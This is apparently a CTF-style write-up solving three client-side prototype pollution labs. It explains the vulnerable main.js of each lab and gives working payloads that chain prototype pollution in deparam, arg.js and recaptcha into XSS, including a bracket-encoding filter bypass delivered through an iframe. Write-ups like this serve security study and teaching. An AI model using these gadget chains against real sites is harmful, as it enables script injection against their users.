---
title: Prototype Pollution Vulnerable Labs
date: 2021-08-24
author: 1nt3rc3pt0r
author_url: https://twitter.com/_1nt3rc3pt0r_
categories:
 - Web Exploitation
 - Labs
tags:
 - Prototype Pollution
 - Client Side
---

**tl;dr**

+ Lab1 - Prototype pollution in deparam when combined with reddit platform.js turns out to be xss
+ Lab2 - Prototype pollution to Xss via arg.js
+ Lab3 - Prototype pollution to Xss via recaptcha 
<!--more-->

**Number of Challenges:** 3

**Challenge Author:** [WHOISbinit](https://twitter.com/WHOISbinit)

**Hosted Challenge:** [here](https://ppvl.whoisbinit.me/)

## Challenge Overview

Few labs based client side Prototype Pollution.

## Solutions

**Lab - I:**

Looking into `main.js`

``` 
window.onload = () => {
    let fragments = location.hash.slice(1);
    if (fragments !== "") localStorage.setItem("ppvl", fragments);
    deparam(atob(localStorage.getItem("ppvl")));
}
```
Js takes input from location.hash and then place them in local storage then passed to deparam() which is [vulnerable to Prototype Pollution](https://snyk.io/vuln/SNYK-JS-JQUERYDEPARAM-1255651).

Redit `platform.js` can be chained with [Prototype Pollution to get xss](https://gist.github.com/keerok/52aa04c35aeb68a383727e978010a47a)

Payload:
 - `__proto__[onload]=alert(1)` 
 - `https://ppvl.whoisbinit.me/lab1/#X19wcm90b19fW29ubG9hZF09YWxlcnQoMSk=` 

**Lab - II:**

Looking into `main.js`

```
let data = {
    small: "Hi, there!",
    big: "Hello, world!"
}

const vuln = document.querySelector("#vuln");
let queryStrings = window.location.search;
let params = new URLSearchParams(queryStrings);

let vulnParams = () => {
    let fragments = Arg.parse(location.hash.substr(1));
    if(data[params.get("type")] !== undefined) vuln.innerHTML = "<h2>"+data[params.get("type")]+"</h2";
    else vuln.innerHTML = "<h2>This region seems like something you need to look at.</h2>";
}

window.onhashchange = () => {
    vulnParams();
}

vulnParams();
```

We have a object called data and `queryStrings` is passed into [URLSearchParams()](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams). [Args.parse is vulnerable to Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md) and take data value from `params.get("type")` place them to innerHTML which means direct xss if we can pollute object and add value.So `data[params.get("type")]` get polluted.


Payload:
 - `constructor[prototype][test]=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E` 
 - `https://ppvl.whoisbinit.me/lab2/?type=test#constructor[prototype][test]=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E` 



**Lab - III:**

Looking into `main.js`

```
let v = document.querySelector("#vuln"),
    r = document.createElement("p"),
    u = window.location != window.parent.location ? document.referrer : document.location;
r.setAttribute("class", "g-recaptcha"), r.setAttribute("data-sitekey", "HighlySecurePrototypes"), v.appendChild(r), setTimeout(() => {
    ~u.indexOf("https://ppvl.whoisbinit.me") && deparam(decodeURI(location.hash.slice(1).replace(/\[\]/i, "")))
}, .1337);
```

`u = window.location != window.parent.location ? document.referrer : document.location;`
If the condition fails we get an object in u which does not have property indexOf() Where code fails at 
`~u.indexOf("https://ppvl.whoisbinit.me")`.
So we have to make `window.location != window.parent.location` to be true.
Inorder to make parent and rendering frame different we have to add the challenge in iframe where location of both differs condition gets satisfied.

```
<iframe src="https://ppvl.whoisbinit.me/lab3" width="1000" height="1000">
```

`~u.indexOf("https://ppvl.whoisbinit.me") && deparam(decodeURI(location.hash.slice(1).replace(/\[\]/i, "")))`

If `~u.indexOf("https://ppvl.whoisbinit.me")` fails it returns -1 and ~-1 is 0. 0 && someobject returns 0 so prototype pollution fails and any number other than 0 Logical And with object returns the object itself.So we have to satisfy this condition too .u is document.referrer which gives details such as where did the current viewed document loaded or referred from .In parent document just give a get request like this `http://localhost/pp_labs.php?bypass=https://ppvl.whoisbinit.me` So the condition `u.indexOf("https://ppvl.whoisbinit.me")` get satisfied in child document(iframe).

`decodeURI(location.hash.slice(1).replace(/\[\]/i,"")))` This just replaced [ and ] which means we can't have something like  `__proto__[test]` as it get replaced.` __proto__.test` is also away but deparam doesn't consider `test` [as __proto__ property](https://openbase.com/js/jquery-deparam) inorder to bypass this restriction we have decodeURI which decode urlencoded to corresponding ascii so we can give [ as %5B and ] as %5D which fails to get detected at regex check.

Payload:

deparam.js is vulnerable to Prototype Pollution and `recaptcha/api.js` is [vulnerable to xss when combined with Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/recaptcha.md)

```
<iframe src="https://ppvl.whoisbinit.me/lab3/#__proto__%5Bsrcdoc%5D%5B%5D=<script>alert(1)</script>" width="1000" height="1000">
```

## Rating:

7/10

